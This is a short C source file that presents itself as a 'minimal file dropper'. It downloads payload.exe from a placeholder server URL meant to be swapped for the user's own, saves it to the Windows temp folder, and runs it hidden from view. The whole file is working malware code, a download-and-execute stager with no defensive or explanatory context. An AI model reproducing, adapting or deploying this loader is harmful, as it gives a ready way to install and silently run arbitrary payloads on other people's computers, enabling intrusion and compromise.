// Cropper v0.1
// Author: Conrad
// Purpose: Minimal File Dropper

#include <windows.h>
#include <urlmon.h>

// Link with Urlmon.lib
#pragma comment(lib, "urlmon.lib")

int main()
{
    HRESULT hr;
    LPCSTR url = "http://127.0.0.1:8080/payload.exe"; // Change this to your server
    CHAR tempPath[MAX_PATH];
    CHAR savePath[MAX_PATH];

    // Get Temp folder path
    if (GetTempPathA(MAX_PATH, tempPath) == 0) {
        return 1;
    }

    // Create full save path
    wsprintfA(savePath, "%s%s", tempPath, "dropped-payload.exe");

    // Download file
    hr = URLDownloadToFileA(NULL, url, savePath, 0, NULL);

    if (SUCCEEDED(hr))
    {
        // Run the downloaded file
        ShellExecuteA(NULL, "open", savePath, NULL, NULL, SW_HIDE);
    }

    return 0;
}
